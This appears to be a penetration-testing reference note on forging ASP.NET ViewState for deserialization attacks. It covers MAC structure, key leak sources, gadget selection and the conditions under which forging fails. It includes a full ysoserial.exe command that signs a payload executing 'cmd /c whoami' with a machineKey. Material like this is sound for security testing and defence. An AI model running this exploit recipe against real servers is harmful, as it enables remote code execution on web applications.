# ViewState — the ASP.NET state blob

## What it is

`__VIEWSTATE` is a `LosFormatter`-serialized object graph, usually MAC'd
(SHA1/HMACSHA256) and sometimes AES-encrypted, carried in every ASP.NET
form postback. The deserialization bug isn't in LosFormatter — it's that
the graph is *typed objects* and the MAC is only as good as the key.

```
<form>
  <input name="__VIEWSTATE" value="/wEPDwUK...">
  <input name="__VIEWSTATEGENERATOR" value="4C97A4A9">
  <input name="__EVENTVALIDATION" value="/wEW...">
```

## The MAC anatomy — what gets signed

```
serialized bytes  →  the __VIEWSTATE value
+ generator       →  the __VIEWSTATEGENERATOR page constant
+ path/apppath    →  the page identity
+ ViewStateUserKey → optional per-session salt
                 MAC'd with validationKey (SHA1/MD5/HMACSHA256/SHA1...)
or encrypted      →  with decryptionKey (AES/3DES/DES)
```

## The four protection states

| Config | Can you forge? |
|---|---|
| `enableViewStateMac="false"` + no encryption | YES — mint raw LosFormatter |
| MAC on, validationKey leaked | YES — sign with the key |
| Encrypted, decryptionKey leaked | YES — decrypt+re-encrypt |
| MAC+key, both unleaked | NO — the key is the wall |

## Where the keys leak

- `web.config` in source/handout → literal `<machineKey validationKey="..." decryptionKey="...">`
- an error page that dumps config (customErrors off + a crash)
- `Blacklist3r` known-key list — IIS default `machineKey`s
- `AutoGenerate` on a non-farm host — per-app-pool key, sometimes recoverable
- a weaker app on the SAME server sharing the key (machineKey is machine-wide)
- `machine.config` (server-wide default) if `web.config` doesn't override

## The exploit command — the full form

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --validationalg="SHA1" \
  --validationkey="65DE352AAA2085F30BA2A08590A1BE4B25E51288" \
  --decryptionalg="AES" \
  --decryptionkey="1A2B3C4D5E6F..." \
  --generator="B97B4E27" \
  --path="/default.aspx" --apppath="/" \
  --viewstateuserkey="optional-if-set" \
  --islegacy --isdebug \
  -c "cmd /c whoami" -o base64
```

The MAC input includes `generator`, `path`, `apppath` — wrong ones = MAC
fail. Read them from the page source (`__VIEWSTATEGENERATOR`) and the URL.

## The MAC-off case — `EnableViewStateMac=false`

```xml
<pages enableViewStateMac="false">
```

The blob is then just LosFormatter — no key needed. `ysoserial.net -p
ViewState` with `--validationalg=""`/no keys emits the unsigned form.
Detection: a `__VIEWSTATE` that decodes to a LosFormatter stream with no
trailing MAC bytes, or a `<pages enableViewStateMac="false">` in web.config.

## `__EVENTVALIDATION` — the sibling

Also LosFormatter+MAC — carries the list of valid event targets. Tampering
it is a different attack (event-target forgery); it shares the same
machineKey, so a key that works on `__VIEWSTATE` works here too.

## Gadget pick — the LosFormatter-compatible set

```
TextFormattingRunProperties    ← the standard — XAML-reader internal
TypeConfuseDelegate            ← clean, small
ActivitySurrogateSelector      ← reliable
WindowsIdentity / ClaimsPrincipal
```

`TextFormattingRunProperties` is the canonical ViewState gadget — works on
LosFormatter and BinaryFormatter.

## `ViewStateUserKey` — the per-session salt

When set, the MAC input includes `Page.User` — a per-session value the
attacker must know to forge. If it's bound to `Session.SessionID` and you
can't predict it → the blob is unforgeable even with the key. Check
`Page.ViewStateUserKey` in source — most apps don't set it.

## The decrypted-read recipe — inspect first

```bash
# decode the LosFormatter to see the object graph the page stores:
# ViewStatePad / viewstate-decoder / a manual LosFormatter parse
# (the blob is usually a System.Web.UI.Control tree — mostly boring,
#  but a serialized custom object inside it = a gadget surface)
```

## The "no ViewState" case — ControlState

`__CONTROLSTATE`/`__EVENTVALIDATION` are sibling fields — same MAC, same
gadget surface. A page with `__EVENTVALIDATION` and no `__VIEWSTATE` still
uses LosFormatter.

## Falsifiers

- `EnableViewStateMac="true"` + no leaked `validationKey` + a
  `ViewStateUserKey` bound to an unknown session → unforgeable
- ASP.NET Core (`<form asp-...`) — ViewState doesn't exist there; the blob
  is a different mechanism entirely
- the blob is `__EVENTVALIDATION` only, server-validated, and no key

## Output to record

- Whether MAC/encryption is on, and the key's source (leak/default/none)
- generator + path + apppath used in the forge
- gadget name + formatter + the verbatim response proving it ran
